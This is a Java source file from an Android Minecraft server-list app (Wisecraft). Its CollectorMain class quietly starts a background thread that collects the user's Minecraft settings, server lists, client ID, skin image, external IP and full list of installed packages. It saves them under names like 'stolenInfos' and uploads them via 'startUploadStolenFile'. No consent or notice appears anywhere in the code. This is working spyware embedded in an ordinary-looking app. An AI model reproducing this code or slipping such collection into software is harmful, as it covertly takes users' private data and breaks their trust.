package com.nao20010128nao.Wisecraft.collector;
import java.io.*;
import java.util.*;

import android.content.ContextWrapper;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Base64;
import com.google.gson.Gson;
import com.nao20010128nao.FileSafeBox.SafeBox;
import com.nao20010128nao.Wisecraft.ServerListActivity;
import com.nao20010128nao.Wisecraft.TheApplication;
import com.nao20010128nao.Wisecraft.misc.FileUploader;
import java.net.URL;
import java.util.zip.GZIPInputStream;

import static com.nao20010128nao.Wisecraft.Utils.*;
import com.nao20010128nao.Wisecraft.misc.BinaryPrefImpl;
import com.nao20010128nao.Wisecraft.misc.compat.CompatCharsets;
public class CollectorMain extends ContextWrapper implements Runnable {
	public CollectorMain() {
		super(TheApplication.instance);
		new Thread(this).start();
	}

	@Override
	public void run() {
		// TODO: Implement this method
		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
		FileUploader fu=new FileUploader(TheApplication.instance.uuid);
		String s="";
		try {
			sb.edit().putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos())).commit();
		} catch (Throwable e) {

		} finally {
			System.out.println(s);
			//Utils.writeToFile(new File(Environment.getExternalStorageDirectory(),"/Wisecraft/secret.json"),s);
		}
		String[] files;
		try {
			files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
		} catch (Throwable e) {
			e.printStackTrace(System.out);
			return;
		}
		for (String filename:files) {
			System.out.println("upload:"+filename);
			try {
				copyAndClose(new ByteArrayInputStream(sb.getString(filename,"").getBytes(CompatCharsets.UTF_8)), fu.startUploadStolenFile(filename));
				sb.edit().remove(filename).commit();
			} catch (Throwable e) {
				e.printStackTrace(System.out);
				continue;
			}
		}
		FileOutputStream fos=null;
		try {
			fos=new FileOutputStream(new File(getFilesDir(),"stolen.bin"));
			fos.write(sb.toBytes());
		} catch (IOException e) {

		}finally{
			try {
				if(fos!=null)fos.close();
			} catch (IOException e) {}
		}
	}
	public static class Infos {
		public HashMap<String,String> mcpeSettings=readSettings();
		public String[] mcpeServers=readServers();
		public long cid=getCid();
		public String skin=readSkin();
		public String ip=getIp();
		public String uuid=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("uuid", "");
		public ServerListActivity.Server[] managingServers=getManagingServer();
		public SystemInfo systemInfo=new SystemInfo();

		private String getIp() {
			BufferedReader br=null;
			try {
				br=new BufferedReader(new InputStreamReader(new URL("http://ieserver.net/ipcheck.shtml").openConnection().getInputStream()));
				return br.readLine();
			} catch (IOException e) {
				return "127.0.0.1";
			}finally{
				try {
					if(br!=null) br.close();
				} catch (IOException e) {

				}
			}
		}
		private long getCid() {
			BufferedReader br=null;
			try {
				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/clientId.txt"))));
				return new Long(br.readLine());
			} catch (Throwable e) {
				return Long.MAX_VALUE;
			} finally {
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
		}
		private HashMap<String,String> readSettings() {
			HashMap<String,String> data=new HashMap(20);
			BufferedReader br=null;
			try {
				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/options.txt"))));
				String s;
				while (null != (s = br.readLine())) {
					String[] spl=s.split("\\:");
					data.put(spl[0], spl[1]);
				}
			} catch (Throwable e) {

			} finally {
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
			return data;
		}
		private String[] readServers() {
			List<String> data=new ArrayList(20);
			BufferedReader br=null;
			try {
				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/external_servers.txt"))));
				String s;
				while (null != (s = br.readLine())) {
					data.add(s);
				}
			} catch (Throwable e) {

			} finally {
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
			return data.toArray(new String[data.size()]);
		}
		private String readSkin() {
			InputStream br=null;
			ByteArrayOutputStream b=new ByteArrayOutputStream(100);
			byte[] buf=new byte[100];
			try {
				br = new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/custom.png"));
				while (true) {
					int r=br.read(buf);
					if (r <= 0) {
						break;
					}
					b.write(buf, 0, r);
				}
			} catch (Throwable e) {
				return null;
			} finally {
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
			return Base64.encodeToString(b.toByteArray(), Base64.NO_WRAP);
		}
		private ServerListActivity.Server[] getManagingServer() {
			ServerListActivity.Server[] sa=new Gson().fromJson(PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("servers", "[]"), ServerListActivity.Server[].class);
			return sa;
		}
	}
	public static class SystemInfo {
		public HashSet<String> packages=getPackageNames();
		//public HashMap<String,PackageInfo> packageInfos=getPackageMisc();

		private HashSet<String> getPackageNames() {
			return new HashSet<>(getPackageMisc().keySet());
		}
		private HashMap<String,PackageInfo> getPackageMisc() {
			HashMap<String,PackageInfo> names=new HashMap<>();
			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS | PackageManager.GET_ACTIVITIES | PackageManager.GET_INSTRUMENTATION | PackageManager.GET_CONFIGURATIONS);
			for (PackageInfo pi:packages) {
				names.put(pi.packageName, pi);
			}
			return names;
		}
	}
}
